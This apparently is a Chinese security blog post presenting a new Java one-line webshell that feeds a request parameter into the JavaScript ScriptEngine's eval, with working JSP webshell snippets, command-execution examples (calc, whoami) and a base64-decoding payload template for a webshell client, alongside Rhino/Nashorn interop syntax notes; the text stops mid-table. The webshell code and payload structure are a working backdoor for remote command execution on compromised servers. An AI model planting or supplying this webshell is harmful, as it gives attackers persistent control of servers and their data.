## 前言
一直以来，Java一句话木马都是采用打入字节码defineClass实现的。这种方法的优势是可以完整的打进去一个类，可以几乎实现Java上的所有功能。不足之处就是Payload过于巨大，并且不像脚本语言一样方便修改。并且还存在很多特征，例如继承ClassLoader，反射调用defineClass等。本人在这里提出一种新型Java一句话木马：利用Java中JS引擎实现的一句话木马。
## 基本原理
  1. Java没有eval函数，Js有eval函数，可以把字符串当代码解析。
  2. Java从1.6开始自带ScriptEngineManager这个类，原生支持调用js，无需安装第三方库。
  3. ScriptEngine支持在Js中调用Java的对象。
综上所述，我们可以利用Java调用JS引擎的eval，然后在Payload中反过来调用Java对象，这就是本文提出的新型Java一句话的核心原理。
ScriptEngineManager全名javax.script.ScriptEngineManager，从Java 6开始自带。其中Java
6/7采用的js解析引擎是Rhino，而从java8开始换成了Nashorn。不同解析引擎对同样的代码有一些差别，这点后面有所体现。
如果说原理其实一两句话就可以说清楚，但是难点在于Payload的编写。跨语言调用最大的一个难点就是数据类型以及方法的转换。例如Java中有byte数组，Js中没有怎么办？C++里有指针但是Java里没有这个玩意怎么办？
在实现期间踩了很多的坑，这篇文章跟大家一起掰扯掰扯，希望能给大家提供点帮助。
### 获取脚本引擎
    //通过脚本名称获取：
    ScriptEngine engine = new ScriptEngineManager().getEngineByName("JavaScript");  //简写为js也可以
    //通过文件扩展名获取： 
    ScriptEngine engine = new ScriptEngineManager().getEngineByExtension("js");  
    //通过MIME类型来获取： 
    ScriptEngine engine = new ScriptEngineManager().getEngineByMimeType("text/javascript");
### 绑定对象
    ScriptEngine engine = new ScriptEngineManager().getEngineByName("js");
    engine.put("request", request);
    engine.put("response", response);
    engine.eval(request.getParameter("mr6"));
或者通过eval的重载函数，直接把对象通过一个HashMap放进去
    new javax.script.ScriptEngineManager().getEngineByName("js").eval(request.getParameter("ant"), new javax.script.SimpleBindings(new java.util.HashMap() {{
    put("response", response);
    put("request", request);
    }}))
### eval
综合上面两步，有很多种写法，例如：
shell.jsp
或者直接缩写成一句：
以执行命令为例：
POST：mr6=java.lang.Runtime.getRuntime().exec("calc");
即可达到命令执行的效果。
## 基本语法
翻阅文档比较枯燥，这里挑一些用到的说一说。
感兴趣的同学也可以看一下原文档：
### 调用Java方法
前面加上全限定类名即可
    var s = [3];
    s[0] = "cmd";
    s[1] = "/c";
    s[2] = "whoami";//yzddmr6
    var p = java.lang.Runtime.getRuntime().exec(s);
    var sc = new java.util.Scanner(p.getInputStream(),"GBK").useDelimiter("\\A");
    var result = sc.hasNext() ? sc.next() : "";
    sc.close();
### 导入Java类型
    var Vector = java.util.Vector;
    var JFrame = Packages.javax.swing.JFrame;
     //这种写法仅仅支持Nashorn，Rhino并不支持
    var Vector = Java.type("java.util.Vector")
    var JFrame = Java.type("javax.swing.JFrame")
### 创建Java类型的数组
    // Rhino
    var Array = java.lang.reflect.Array
    var intClass = java.lang.Integer.TYPE
    var array = Array.newInstance(intClass, 8)
    // Nashorn
    var IntArray = Java.type("int[]")
    var array = new IntArray(8)
### 导入Java类
默认情况下，Nashorn 不会导入Java的包。这样主要为了避免类型冲突，比如你写了一个new
String，引擎怎么知道你new的是Java的String还是js的String？所以所有的Java的调用都需要加上全限定类名。但是这样写起来很不方便。
这个时候大聪明Mozilla Rhino 就想了一个办法，整了个扩展文件，里面提供了importClass 跟importPackage
方法，可以导入指定的Java包。
  * importClass 导入指定Java的类，现在推荐用Java.type
  * importPackage 导入一个Java包，类似import com.yzddmr6.*，现在推荐用JavaImporter 
这里需要注意的是，Rhino对该语法的错误处理机制，当被访问的类存在时，Rhino加载该class，而当其不存在时，则把它当成package名称，而并不会报错。
    load("nashorn:mozilla_compat.js");
    importClass(java.util.HashSet);
    var set = new HashSet();
    importPackage(java.util);
    var list = new ArrayList();
在一些特殊情况下，导入的全局包会影响js中的函数，例如类名冲突。这个时候可以用JavaImporter，并配合with语句，对导入的Java包设定一个使用范围。
    // create JavaImporter with specific packages and classes to import
    var SwingGui = new JavaImporter(javax.swing,
                                javax.swing.event,
                                javax.swing.border,
                                java.awt.event);
    with (SwingGui) {
        // 在with里面才可以调用swing里面的类，防止污染
        var mybutton = new JButton("test");
        var myframe = new JFrame("test");
    }
### 方法调用与重载
方法在JavaScript中实际上是对象的一个属性，所以除了使用 . 来调用方法之外，也可以使用[]来调用方法：
    var System = Java.type('java.lang.System');
    System.out.println('Hello, World');    // Hello, World
    System.out['println']('Hello, World'); // Hello, World
Java支持重载（Overload）方法，例如，System.out 的 println
有多个重载版本，如果你想指定特定的重载版本，可以使用[]指定参数类型。例如：
    var System = Java.type('java.lang.System');
    System.out['println'](3.14);          // 3.14
    System.out['println(double)'](3.14);  // 3.14
    System.out['println(int)'](3.14);     // 3
## Payload结构设计
详情写在注释里了
    //导入基础拓展
    try {
      load("nashorn:mozilla_compat.js");
    } catch (e) {}
    //导入常见包
    importPackage(Packages.java.util);
    importPackage(Packages.java.lang);
    importPackage(Packages.java.io);
    var output = new StringBuffer(""); //输出
    var cs = "${jspencode}"; //设置字符集编码
    var tag_s = "${tag_s}"; //开始符号
    var tag_e = "${tag_e}"; //结束符号
    try {
      response.setContentType("text/html");
      request.setCharacterEncoding(cs);
      response.setCharacterEncoding(cs);
      function decode(str) {
        //参数解码
        str = str.substr(2);
        var bt = Base64DecodeToByte(str);
        return new java.lang.String(bt, cs);
      }
      function Base64DecodeToByte(str) {
        importPackage(Packages.sun.misc);
        importPackage(Packages.java.util);
        var bt;
        try {
          bt = new BASE64Decoder().decodeBuffer(str);
        } catch (e) {
          bt = Base64.getDecoder().decode(str);
        }
        return bt;
      }
      function asoutput(str) {
        //回显加密
        return str;
      }
      function func(z1) {
        //eval function
        return z1;
      }
      output.append(func(z1)); //添加功能函数回显
    } catch (e) {
      output.append("ERROR:// " + e.toString()); //输出错误
    }
    try {
      response.getWriter().print(tag_s + asoutput(output.toString()) + tag_e); //回显
    } catch (e) {}
## 语法问题的坑
### 两种语言对象间的相互转换
要注意的是，在遇到Java跟JS可能存在类型冲突的地方，即使导入了包也要加上全限定类名。
在编写payload的时候被坑了很久的一个问题就是，在导入java.lang以后写new
String(bt,cs)没有加全限定类名，导致打印出来的一直是一个字符串地址。
正确的操作是new java.lang.String(bt,cs)。因为在Java和Js中均存在String类，按照优先级，直接new出来的会是Js的对象。
下面附上类型对比表：
JavaScript Value | JavaScript Type | Java Type | Is Scriptable | Is Function  
---|---|---|---|---  
{a:1, b:['x','y']} | object | org.mozilla.javascript.NativeObject | **+** | -  
[1,2,3] | object | org.mozilla.javascript.NativeArray | **+** | -  
1 | number | java.lang.Double | - | -  
1.2345 | number | java.lang.Double | - | -  
NaN | number | java.lang.Double | - | -  